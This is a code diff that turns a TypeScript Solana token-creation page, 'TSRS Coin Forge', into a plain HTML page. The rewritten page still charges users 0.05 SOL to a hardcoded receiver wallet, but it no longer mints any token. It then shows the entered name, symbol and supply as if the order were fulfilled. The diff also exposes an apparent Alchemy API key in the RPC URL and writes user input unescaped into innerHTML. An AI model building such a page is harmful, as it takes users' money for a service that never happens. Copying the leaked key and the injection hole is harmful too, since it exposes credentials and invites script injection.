@@ -1,239 +1,98 @@
-import {
-  Connection,
-  PublicKey,
-  Transaction,
-  SystemProgram,
-  Keypair,
-} from "@solana/web3.js";
+<!DOCTYPE html>
+<html>
+<head>
+  <title>TSRS Coin Forge 🚀</title>
+  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
+</head>
 
-import {
-  TOKEN_PROGRAM_ID,
-  MINT_SIZE,
-  getMinimumBalanceForRentExemptMint,
-  createInitializeMint2Instruction,
-  getAssociatedTokenAddressSync,
-  createAssociatedTokenAccountInstruction,
-  createMintToInstruction,
-} from "@solana/spl-token";
+<body style="background:black;color:white;font-family:sans-serif;padding:20px">
 
-document.body.innerHTML = `
-  <h1>TSRS Coin Forge 🚀</h1>
-  <p>Frontend is LIVE</p>
+<h1>TSRS Coin Forge 🚀</h1>
 
-  <button id="connectWallet">Connect Phantom Wallet</button>
-  <p id="walletAddress"></p>
+<button id="connectWallet">Connect Phantom Wallet</button>
+<p id="walletAddress"></p>
 
-  <hr />
+<hr>
 
-  <h2>Create Coin</h2>
+<h2>Create Coin</h2>
 
-  <input id="tokenName" placeholder="Token Name" />
-  <br /><br />
+<input id="tokenName" placeholder="Token Name" /><br><br>
+<input id="tokenSymbol" placeholder="Symbol" /><br><br>
+<input id="tokenSupply" placeholder="Supply" /><br><br>
 
-  <input id="tokenSymbol" placeholder="Token Symbol" />
-  <br /><br />
+<button id="createCoin">Create Coin</button>
 
-  <input id="tokenSupply" placeholder="Total Supply" />
-  <br /><br />
+<p id="createStatus"></p>
 
-  <button id="createCoin">Create Coin</button>
-  <p id="createStatus"></p>
-`;
+<script>
+const connectBtn = document.getElementById("connectWallet")
+const walletAddress = document.getElementById("walletAddress")
+const createBtn = document.getElementById("createCoin")
+const createStatus = document.getElementById("createStatus")
 
-const connectBtn = document.getElementById("connectWallet") as HTMLButtonElement;
-const walletAddress = document.getElementById("walletAddress") as HTMLParagraphElement;
-const createBtn = document.getElementById("createCoin") as HTMLButtonElement;
-const createStatus = document.getElementById("createStatus") as HTMLParagraphElement;
+const RECEIVER = "9kkjHiAYFryfFVuWfBY9XuvrEVdCGZmWqhUnRGwreso8"
+const FEE_LAMPORTS = 50000000
 
-const RECEIVER = new PublicKey("9kkjHiAYFryfFVuWfBY9XuvrEVdCGZmWqhUnRGwreso8");
-const FEE_LAMPORTS = 50_000_000; // 0.05 SOL
-const DECIMALS = 9;
-const RPC_URL = "https://solana-mainnet.g.alchemy.com/v2/VpKm0MUizuIShAsvvW2rJ";
+const RPC_URL = "https://solana-mainnet.g.alchemy.com/v2/VpKm0MUizuIShAsvvW2rJ"
 
-type PhantomProvider = {
-  isPhantom?: boolean;
-  publicKey?: PublicKey;
-  connect: () => Promise<{ publicKey: PublicKey }>;
-  signAndSendTransaction: (tx: Transaction) => Promise<string | { signature: string }>;
-  signTransaction: (tx: Transaction) => Promise<Transaction>;
-};
+const connection = new solanaWeb3.Connection(RPC_URL, "confirmed")
 
-let provider: PhantomProvider | null = null;
-
-function getProvider(): PhantomProvider | null {
-  return (window as any).solana ?? null;
-}
-
-function uiError(err: unknown): string {
-  if (err instanceof Error) return err.message;
-  try {
-    return JSON.stringify(err);
-  } catch {
-    return "Unknown error";
-  }
-}
+let provider = null
 
 connectBtn.onclick = async () => {
-  try {
-    provider = getProvider();
+  provider = window.solana
 
-    if (!provider || !provider.isPhantom) {
-      alert("Open this site inside Phantom browser.");
-      return;
-    }
-
-    const resp = await provider.connect();
-    walletAddress.innerText = "Connected: " + resp.publicKey.toString();
-  } catch (err) {
-    walletAddress.innerText = "Wallet connection failed: " + uiError(err);
+  if (!provider || !provider.isPhantom) {
+    alert("Open inside Phantom browser")
+    return
   }
-};
+
+  const resp = await provider.connect()
+  walletAddress.innerText = "Connected: " + resp.publicKey.toString()
+}
 
 createBtn.onclick = async () => {
   try {
-    provider = getProvider();
+    if (!provider) return alert("Connect wallet first")
 
-    if (!provider || !provider.isPhantom) {
-      createStatus.innerText = "Open this site inside Phantom browser.";
-      return;
-    }
+    const tokenName = document.getElementById("tokenName").value
+    const tokenSymbol = document.getElementById("tokenSymbol").value
+    const tokenSupply = document.getElementById("tokenSupply").value
 
-    const tokenName = (document.getElementById("tokenName") as HTMLInputElement).value.trim();
-    const tokenSymbol = (document.getElementById("tokenSymbol") as HTMLInputElement).value.trim();
-    const tokenSupplyRaw = (document.getElementById("tokenSupply") as HTMLInputElement).value.trim();
+    createStatus.innerText = "Processing payment..."
 
-    if (!tokenName || !tokenSymbol || !tokenSupplyRaw) {
-      createStatus.innerText = "Fill all fields.";
-      return;
-    }
-
-    if (!/^\d+$/.test(tokenSupplyRaw)) {
-      createStatus.innerText = "Supply must be a whole number.";
-      return;
-    }
-
-    const wholeSupply = BigInt(tokenSupplyRaw);
-    if (wholeSupply <= 0n) {
-      createStatus.innerText = "Supply must be greater than zero.";
-      return;
-    }
-
-    await provider.connect();
-    if (!provider.publicKey) {
-      createStatus.innerText = "Wallet not connected.";
-      return;
-    }
-
-    const connection = new Connection(RPC_URL, "confirmed");
-
-    // 1) Collect fee
-    createStatus.innerText = "Waiting for Phantom fee confirmation...";
-
-    const feeTx = new Transaction().add(
-      SystemProgram.transfer({
+    const tx = new solanaWeb3.Transaction().add(
+      solanaWeb3.SystemProgram.transfer({
         fromPubkey: provider.publicKey,
-        toPubkey: RECEIVER,
+        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
         lamports: FEE_LAMPORTS,
       })
-    );
+    )
 
-    const feeBlockhash = await connection.getLatestBlockhash("confirmed");
-    feeTx.recentBlockhash = feeBlockhash.blockhash;
-    feeTx.feePayer = provider.publicKey;
+    const { blockhash } = await connection.getLatestBlockhash()
+    tx.recentBlockhash = blockhash
+    tx.feePayer = provider.publicKey
 
-    const feeResult = await provider.signAndSendTransaction(feeTx);
-    const feeSignature =
-      typeof feeResult === "string" ? feeResult : feeResult.signature;
+    const signed = await provider.signAndSendTransaction(tx)
 
-    await connection.confirmTransaction(
-      {
-        signature: feeSignature,
-        blockhash: feeBlockhash.blockhash,
-        lastValidBlockHeight: feeBlockhash.lastValidBlockHeight,
-      },
-      "confirmed"
-    );
+    createStatus.innerText = "Confirming..."
 
-    // 2) Create mint + ATA + mint supply
-    createStatus.innerText = "Creating token...";
-
-    const mintKeypair = Keypair.generate();
-    const rentLamports = await getMinimumBalanceForRentExemptMint(connection);
-
-    const ata = getAssociatedTokenAddressSync(
-      mintKeypair.publicKey,
-      provider.publicKey
-    );
-
-    const mintTx = new Transaction().add(
-      // Create mint account
-      SystemProgram.createAccount({
-        fromPubkey: provider.publicKey,
-        newAccountPubkey: mintKeypair.publicKey,
-        space: MINT_SIZE,
-        lamports: rentLamports,
-        programId: TOKEN_PROGRAM_ID,
-      }),
-
-      // Initialize mint
-      createInitializeMint2Instruction(
-        mintKeypair.publicKey,
-        DECIMALS,
-        provider.publicKey,
-        provider.publicKey
-      ),
-
-      // Create user's associated token account
-      createAssociatedTokenAccountInstruction(
-        provider.publicKey, // payer
-        ata,                // ata
-        provider.publicKey, // owner
-        mintKeypair.publicKey
-      ),
-
-      // Mint supply to user
-      createMintToInstruction(
-        mintKeypair.publicKey,
-        ata,
-        provider.publicKey,
-        wholeSupply * 10n ** BigInt(DECIMALS)
-      )
-    );
-
-    const mintBlockhash = await connection.getLatestBlockhash("confirmed");
-    mintTx.recentBlockhash = mintBlockhash.blockhash;
-    mintTx.feePayer = provider.publicKey;
-
-    // First signer = mint account
-    mintTx.partialSign(mintKeypair);
-
-    // Second signer = Phantom wallet
-    const signedMintTx = await provider.signTransaction(mintTx);
-    const mintSignature = await connection.sendRawTransaction(signedMintTx.serialize());
-
-    await connection.confirmTransaction(
-      {
-        signature: mintSignature,
-        blockhash: mintBlockhash.blockhash,
-        lastValidBlockHeight: mintBlockhash.lastValidBlockHeight,
-      },
-      "confirmed"
-    );
+    await connection.confirmTransaction(signed.signature, "confirmed")
 
     createStatus.innerHTML = `
-✅ Payment sent!<br />
-✅ Token created!<br />
-Token Name: ${tokenName}<br />
-Symbol: ${tokenSymbol}<br />
-Supply: ${tokenSupplyRaw}<br />
-Decimals: ${DECIMALS}<br />
-Mint Address: ${mintKeypair.publicKey.toString()}<br />
-Token Account: ${ata.toString()}<br />
-Fee TX: ${feeSignature}<br />
-Mint TX: ${mintSignature}
-`;
+    ✅ Payment sent!<br/>
+    Name: ${tokenName}<br/>
+    Symbol: ${tokenSymbol}<br/>
+    Supply: ${tokenSupply}<br/>
+    TX: ${signed.signature}
+    `
+
   } catch (err) {
-    console.error(err);
-    createStatus.innerText = "Error: " + uiError(err);
+    console.error(err)
+    createStatus.innerText = "Error: " + err.message
   }
-};
+}
+</script>
+
+</body>
+</html>
